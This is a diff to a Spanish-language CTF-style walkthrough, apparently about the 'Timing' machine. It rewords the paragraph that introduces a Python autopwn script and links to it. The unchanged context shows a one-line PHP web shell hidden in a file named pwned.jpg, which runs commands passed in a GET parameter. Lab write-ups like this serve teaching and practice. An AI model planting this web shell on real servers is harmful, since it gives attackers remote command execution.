@@ -500,8 +500,8 @@ p3ntest1ng:~$ vi pwned.jpg
 <?php system($_GET[pwn]);?>
 ```
 
-En este punto vamos a crear un script en python que nos automatice todo el proceso anterior,
-además de la subida del archivo de forma que sólo tengamos que ejecutarlo y pasarle una imagen maliciosa (que en realidad contiene PHP).
+Sabiendo toda esta información, podemos crear un script en python que nos automatice todo el proceso anterior,
+además de la subida del archivo de forma que sólo tengamos que ejecutarlo para obtener una pseudo-shell y ejecutar comandos en el sistema.
 
 Os dejo el enlace al script [AutoPwn_Timing.py](https://github.com/WildZarek/wildzarek.github.io/blob/master/scripts/python/autopwn_timing.py)
 
